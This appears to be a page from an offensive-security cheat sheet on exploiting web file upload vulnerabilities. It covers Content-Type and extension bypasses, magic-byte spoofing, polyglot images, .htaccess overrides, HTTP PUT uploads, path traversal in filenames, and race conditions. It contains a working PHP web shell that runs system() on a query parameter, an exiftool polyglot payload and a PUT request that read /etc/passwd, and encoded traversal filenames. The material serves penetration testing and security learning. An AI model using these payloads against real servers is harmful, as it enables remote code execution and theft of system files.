---
title: "File Upload Vulnerabilities"
weight: 9
description: "Understand how to exploit file upload functionalities through flawed validation, misconfigurations, race conditions, and other advanced techniques."
---

# File Upload Vulnerabilities

Improper handling of file uploads is a common security weakness in web applications. If not carefully validated, uploaded files can lead to remote code execution (RCE), cross-site scripting (XSS), and other types of attacks.

{{< hint style=warning >}}
**Warning**: By default, servers do not execute uploaded files unless they are explicitly configured to do so.
{{< /hint >}}

---

## Flawed File Validation

Poor validation allows attackers to bypass filters and upload dangerous files.

### Content-Type Bypass

Change `Content-Type` to an allow MIME type. (e.g. `image/jpeg`)

### Dangerous File Extensions

Some file extensions are known to trigger execution on the server. Even if certain types are blacklisted, you can still try alternate or obfuscated extensions:

```sh
# Common dangerous extensions
.php
.php3
.php4
.php5
.phtml
.phar

# Obfuscation examples
exploit.pHp
exploit.php.jpg
exploit.php.
exploit%2Ephp
exploit.asp;.jpg
exploit.asp%00.jpg
exploit.p.phphp
```

### File Content Validation

Even if the extension is valid, some servers validate the file content using magic numbers (specific byte patterns at the start of files).

| File     | Hex Signature                       | ISO 8859-1   |
| -------- | ----------------------------------- | ------------ |
| PNG      | 89 50 4E 47 0D 0A 1A 0A             | ‰PNG␍␊␚␊     |
| JPG/JPEG | FF D8 FF EE                         | ÿØÿî         |
| JPG/JPEG | FF D8 FF E0                         | ÿØÿà         |
| JPG/JPEG | FF D8 FF E0 00 10 4A 46 49 46 00 01 | ÿØÿà␀␐JFIF␀␁ |
| PDF      | 25 50 44 46 2D                      | %PDF-        |

You can still inject malicious code using a valid header:

```php
ÿØÿî
<?php echo system($_GET['cmd']); ?>
```

### Polyglot Files

Create a polyglot JPEG file containing malicious code within its metadata

```sh
exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```

This works if you can upload a php extension file. This works why you have a real image file (that bypass restrictions) but when you open the image it's executed as php script.

---

## Overriding Server Configuration

Many servers allow configuration files in directories to override global settings. Web servers use them when present, but they're not accessible via HTTP requests.

If the file extension is blacklisted, you might trick the server into mapping a custom file extension to an executable MIME type.

* Apache servers → `.htaccess`
* Example: `AddType application/x-httpd-php .<EXTENSION>`

---

## PUT Method Exploitation

Some servers support the HTTP `PUT` method for uploading files directly.

```http
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/etc/passwd'); ?>
```

---

## Path Traversal + File Upload

If execution is blocked in the upload directory but the web server use the filename field in the request to determine the file’s name and location, you can try to escape using path traversal in the `filename` field:

```http
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
```

{{< hint style=tips >}}
**Tip**: If directory traversal is filtered, try encoding it: `filename="..%2fexploit.php"`.
{{< /hint >}}

---

## Upload Without RCE

Even without remote code execution, you can still cause harm:

- Upload `.html` or `.svg` files with embedded JavaScript → **Stored XSS**
- Upload XML files like `.docx`, `.xlsx` → Possible **XXE injection**

---

## Race Conditions in File Uploads

In some setups, files are uploaded and scanned (e.g., with antivirus) before being permanently stored. During this short window, the file may exist temporarily on disk and you could potentially execute it.

- Race conditions
- Difficult to detect

### Exploiting URL-Based Uploads

If a file is loaded into a temporary directory with a randomized name, it should be impossible for an attacker to exploit any race conditions.

* If the randomized directory name is generated using pseudo-random functions like PHP's `uniqid()`, it can potentially be brute-forced.
  * Try to extend the amount of time taken to process the file by uploading a larger file
* If it is processed in chunks, you can potentially take advantage of this by creating a malicious file with the payload at the start, followed by a large number of arbitrary padding bytes.